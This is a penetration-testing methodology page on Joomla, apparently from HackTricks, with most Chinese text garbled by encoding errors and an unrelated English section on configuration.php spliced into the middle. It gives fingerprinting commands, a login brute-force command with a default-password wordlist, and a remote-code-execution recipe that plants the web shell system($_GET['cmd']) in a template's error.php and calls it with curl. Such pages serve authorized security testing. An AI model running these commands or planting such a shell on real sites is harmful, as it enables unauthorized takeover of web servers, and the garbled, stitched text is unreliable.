# Joomla

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æƒ³è¦çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­å®£ä¼ **å—ï¼Ÿ æˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

### Joomlaç»Ÿè®¡ä¿¡æ¯

Joomlaæ”¶é›†ä¸€äº›åŒ¿åçš„[ä½¿ç”¨ç»Ÿè®¡ä¿¡æ¯](https://developer.joomla.org/about/stats.html)ï¼Œä¾‹å¦‚Joomlaã€PHPå’Œæ•°æ®åº“ç‰ˆæœ¬çš„åˆ†å¸ƒä»¥åŠJoomlaå®‰è£…ä¸­ä½¿ç”¨çš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿã€‚ å¯ä»¥é€šè¿‡ä»–ä»¬çš„å…¬å…±[API](https://developer.joomla.org/about/stats/api.html)æŸ¥è¯¢è¿™äº›æ•°æ®ã€‚
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## æšä¸¾

### å‘ç°/è¶³è¿¹

* æ£€æŸ¥ **meta**
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt

* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

## Joomla

### Joomla Configuration File

The Joomla configuration file `configuration.php` contains sensitive information such as database credentials and secret keys. It is located in the root directory of the Joomla installation.

### Finding Joomla Configuration File

To find the Joomla configuration file, you can use various methods such as:

1. **Manual Inspection**: Look for `configuration.php` in the root directory of the Joomla installation.
   
2. **Automated Tools**: Tools like `Joomscan` can help in identifying the Joomla configuration file.

### Joomla Configuration File Structure

The Joomla configuration file has a specific structure that includes database connection settings, secret keys, and other configuration options. Understanding this structure is crucial for extracting valuable information during a penetration test.

### Exploiting Joomla Configuration File

Once you have access to the Joomla configuration file, you can extract sensitive information like database credentials, secret keys, and other configuration details. This information can be used to further exploit the Joomla application or escalate privileges on the target system.

### Protecting Joomla Configuration File

To protect the Joomla configuration file from unauthorized access, ensure that proper file permissions are set. Restrict access to the file using secure configurations and regularly monitor for any unauthorized changes.
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### ç‰ˆæœ¬

* åœ¨ **/administrator/manifests/files/joomla.xml** ä¸­å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ã€‚
* åœ¨ **/language/en-GB/en-GB.xml** ä¸­å¯ä»¥è·å– Joomla çš„ç‰ˆæœ¬ã€‚
* åœ¨ **plugins/system/cache/cache.xml** ä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¤§è‡´çš„ç‰ˆæœ¬ã€‚
```bash
droopescan scan joomla --url http://joomla-site.local/
```
### Brute-Force

æ‚¨å¯ä»¥ä½¿ç”¨æ­¤[è„šæœ¬](https://github.com/ajnik/joomla-bruteforce)å°è¯•å¯¹ç™»å½•è¿›è¡Œæš´åŠ›ç ´è§£ã€‚
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

å¦‚æœä½ æˆåŠŸè·å–äº†**ç®¡ç†å‘˜å‡­è¯**ï¼Œä½ å¯ä»¥é€šè¿‡æ·»åŠ ä¸€å°æ®µ**PHPä»£ç **æ¥å®ç°**RCE**ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡**è‡ªå®šä¹‰**ä¸€ä¸ª**æ¨¡æ¿**æ¥å®ç°è¿™ä¸€ç‚¹ã€‚

1. åœ¨`Configuration`ä¸‹æ–¹ç‚¹å‡»**`Templates`**ä»¥æ‰“å¼€æ¨¡æ¿èœå•ã€‚
2. ç‚¹å‡»ä¸€ä¸ª**æ¨¡æ¿**åç§°ã€‚è®©æˆ‘ä»¬é€‰æ‹©`Template`åˆ—æ ‡é¢˜ä¸‹çš„**`protostar`**ã€‚è¿™å°†å¸¦æˆ‘ä»¬åˆ°**`Templates: Customise`**é¡µé¢ã€‚
3. æœ€åï¼Œä½ å¯ä»¥ç‚¹å‡»ä¸€ä¸ªé¡µé¢ä»¥æŸ¥çœ‹**é¡µé¢æºä»£ç **ã€‚è®©æˆ‘ä»¬é€‰æ‹©**`error.php`**é¡µé¢ã€‚æˆ‘ä»¬å°†æ·»åŠ ä¸€ä¸ª**PHP ä¸€è¡Œä»£ç æ¥æ‰§è¡Œä»£ç **ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
   ```php
   system($_GET['cmd']);
   ```
4. **ä¿å­˜å¹¶å…³é—­**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`
